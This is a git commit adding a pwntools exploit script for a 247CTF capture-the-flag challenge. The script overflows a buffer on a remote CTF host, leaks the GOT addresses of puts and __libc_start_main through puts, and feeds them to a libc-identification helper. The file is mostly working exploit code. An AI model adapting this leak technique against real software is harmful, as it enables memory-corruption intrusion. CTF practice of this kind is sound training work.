3fc9af413f8123ab8005c929aea20a36497de6b2
guyinatuxedo <ryancmeinke@gmail.com>
2020-03-17 17:37:11 -0700

    4 successful remote libc attacks

---
+++ 8-remoteLibcId/247ctf_hidden-parameters/noop/afterlife.py
@@ -0,0 +1,24 @@
+from pwn import *
+
+import TheNight
+
+import sys
+
+target = remote("05574502f4f53cad.247ctf.com", 50231)
+payload = ""
+payload += "00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+payload += p32(0x8048410)
+payload += p32(0x8048410)
+payload += p32(0x804a018)
+payload += p32(0x804a01c)
+target.sendline(payload)
+target.recvline()
+target.recvline()
+leak = target.recv(4)
+gotAddress0 = u32(leak)
+target.recvline()
+leak = target.recv(4)
+gotAddress1 = u32(leak)
+symbol0 = "puts"
+symbol1 = "__libc_start_main"
+TheNight.findLibcVersionAutomated("puts", gotAddress0, "__libc_start_main", gotAddress1)
